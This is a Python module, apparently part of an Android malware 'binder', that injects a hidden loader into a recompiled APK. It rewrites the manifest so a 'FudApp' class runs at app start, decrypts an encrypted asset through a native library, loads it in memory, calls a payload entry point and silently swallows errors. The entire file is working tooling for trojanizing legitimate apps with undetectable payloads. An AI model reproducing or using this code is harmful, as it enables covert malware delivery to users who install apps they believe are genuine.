"""
Injects loader.dex + assets/p.bin + libloader.so into a recompiled APK,
and rewrites AndroidManifest to point at FudApp.
"""
import os
import re
import shutil
import struct
import subprocess
import zipfile
import xml.etree.ElementTree as ET
from config import (
    JAVA_BIN, D8_BIN, APKTOOL_JAR,
    LOADER_SRC_DIR, LOADER_DEX, LOADER_SO_DIR,
)

ANDROID_NS = "http://schemas.android.com/apk/res/android"
ET.register_namespace("android", ANDROID_NS)

_LOADER_LOADER_JAVA = r"""
package com.system.fud;

import android.content.Context;
import android.os.Build;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;

public final class Loader {
    public static void init(Context ctx) {
        try {
            byte[] enc = readAll(ctx.getAssets().open("p.bin"));
            byte[] dec = NativeBridge.decrypt(enc);
            if (dec == null || dec.length < 2) return;

            ClassLoader cl;
            if (Build.VERSION.SDK_INT >= 26) {
                cl = new InMemoryDexClassLoader(ByteBuffer.wrap(dec), ctx.getClassLoader());
            } else {
                File tmp = new File(ctx.getCacheDir(), "d" + System.nanoTime() + ".dex");
                FileOutputStream fos = new FileOutputStream(tmp);
                fos.write(dec); fos.close();
                cl = new DexClassLoader(tmp.getAbsolutePath(),
                                        ctx.getCacheDir().getAbsolutePath(),
                                        null, ctx.getClassLoader());
                tmp.delete();
            }
            Class<?> entry = cl.loadClass("com.payload.Entry");
            Method m = entry.getMethod("start", Context.class);
            m.invoke(null, ctx);
        } catch (Throwable t) {
            // silent
        }
    }

    private static byte[] readAll(InputStream is) throws Exception {
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = is.read(buf)) > 0) bo.write(buf, 0, n);
        is.close();
        return bo.toByteArray();
    }
}
"""

_NATIVE_BRIDGE_JAVA = r"""
package com.system.fud;

public final class NativeBridge {
    static { System.loadLibrary("loader"); }
    public static native byte[] decrypt(byte[] data);
}
"""

_FUD_APP_JAVA_TMPL = r"""
package com.system.fud;

import android.content.Context;

public class FudApp extends {SUPER} {{
    @Override
    protected void attachBaseContext(Context base) {{
        super.attachBaseContext(base);
        Loader.init(base);
    }}
}}
"""


def _read_app_class(decompiled_dir: str) -> str:
    """Return the fully-qualified class name of <application android:name>, or android.app.Application."""
    path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    root = ET.parse(path).getroot()
    app = root.find("application")
    if app is None:
        return "android.app.Application"
    name = app.get(f"{{{ANDROID_NS}}}name")
    if not name:
        return "android.app.Application"
    if name.startswith("."):
        pkg = root.get("package") or ""
        return pkg + name
    return name


def _patch_manifest(decompiled_dir: str):
    path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    tree = ET.parse(path)
    root = tree.getroot()
    app = root.find("application")
    if app is None:
        app = ET.SubElement(root, "application")
    app.set(f"{{{ANDROID_NS}}}name", "com.system.fud.FudApp")
    tree.write(path, encoding="utf-8", xml_declaration=True)
    print("[✓] manifest application → com.system.fud.FudApp")


def _build_loader_dex(original_class: str):
    """Compile Loader/NativeBridge/FudApp to a single classes2.dex. Cached."""
    if os.path.exists(LOADER_DEX) and os.path.getmtime(LOADER_DEX) > os.path.getmtime(__file__):
        return
    os.makedirs(LOADER_SRC_DIR, exist_ok=True)

    with open(os.path.join(LOADER_SRC_DIR, "Loader.java"), "w") as f:
        f.write(_LOADER_LOADER_JAVA)
    with open(os.path.join(LOADER_SRC_DIR, "NativeBridge.java"), "w") as f:
        f.write(_NATIVE_BRIDGE_JAVA)
    with open(os.path.join(LOADER_SRC_DIR, "FudApp.java"), "w") as f:
        f.write(_FUD_APP_JAVA_TMPL.format(SUPER=original_class))

    # assume android.jar bundled at TOOLS_DIR/platforms/android-34/android.jar
    from config import TOOLS_DIR
    android_jar = os.path.join(TOOLS_DIR, "platforms", "android-34", "android.jar")
    if not os.path.exists(android_jar):
        # minimal stub compile — d8 without bootclasspath will fail; require jar
        raise RuntimeError(f"missing {android_jar}. download platform first.")

    out_dir = os.path.join(LOADER_SRC_DIR, "classes")
    os.makedirs(out_dir, exist_ok=True)

    srcs = [os.path.join(LOADER_SRC_DIR, n) for n in ("Loader.java", "NativeBridge.java", "FudApp.java")]
    subprocess.run(
        [JAVA_BIN, "-jar", os.path.join(os.path.dirname(JAVA_BIN), "..", "lib", "jrt-fs.jar")] if False else
        [JAVA_BIN, "-version"], check=False, capture_output=True
    )
    # javac comes with JDK, but JRE lacks it. require JDK or vendored ecj.
    javac = os.path.join(os.path.dirname(JAVA_BIN), "javac")
    if not os.path.exists(javac):
        raise RuntimeError("JDK required for loader compile — install javac.")

    subprocess.run([javac, "-cp", android_jar, "-d", out_dir] + srcs, check=True)

    subprocess.run(
        [D8_BIN, "--min-api", "24", "--output", LOADER_DEX,
         "--lib", android_jar] +
        [os.path.join(out_dir, "com", "system", "fud", n) for n in
         ("Loader.class", "NativeBridge.class", "FudApp.class")],
        check=True
    )
    # d8 outputs classes.dex next to --output path
    if os.path.exists(LOADER_DEX + "/classes.dex"):
        shutil.move(LOADER_DEX + "/classes.dex", LOADER_DEX)
        shutil.rmtree(os.path.dirname(LOADER_DEX + "/x"), ignore_errors=True)
    print(f"[✓] loader dex built → {LOADER_DEX}")


def _add_to_apk(apk_path: str, payload_bin: str, loader_dex: str, so_root: str):
    """Append classes2.dex + assets/p.bin + libs into existing APK."""
    tmp = apk_path + ".tmp"
    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        # preserve everything except META-INF (will be re-signed)
        for item in zin.infolist():
            if item.filename.startswith("META-INF/"):
                continue
            if item.filename == "classes2.dex":
                continue
            if item.filename == "assets/p.bin":
                continue
            if item.filename.startswith("lib/") and item.filename.endswith("/libloader.so"):
                continue
            zout.writestr(item, zin.read(item.filename))

        # classes2.dex — STORED, must be first non-dex is fine
        with open(loader_dex, "rb") as f:
            zout.writestr("classes2.dex", f.read(), compress_type=zipfile.ZIP_STORED)

        # assets/p.bin
        with open(payload_bin, "rb") as f:
            zout.writestr("assets/p.bin", f.read(), compress_type=zipfile.ZIP_STORED)

        # libs
        for abi in os.listdir(so_root):
            so_path = os.path.join(so_root, abi, "libloader.so")
            if os.path.exists(so_path):
                with open(so_path, "rb") as f:
                    zout.writestr(f"lib/{abi}/libloader.so",
                                  f.read(), compress_type=zipfile.ZIP_STORED)

    shutil.move(tmp, apk_path)


def inject_payload(decompiled_dir: str, recompiled_apk: str, payload_bin: str):
    original_class = _read_app_class(decompiled_dir)
    print(f"[*] original Application: {original_class}")

    _build_loader_dex(original_class)
    _patch_manifest(decompiled_dir)
    _add_to_apk(recompiled_apk, payload_bin, LOADER_DEX, LOADER_SO_DIR)
    print("[✓] payload injected")
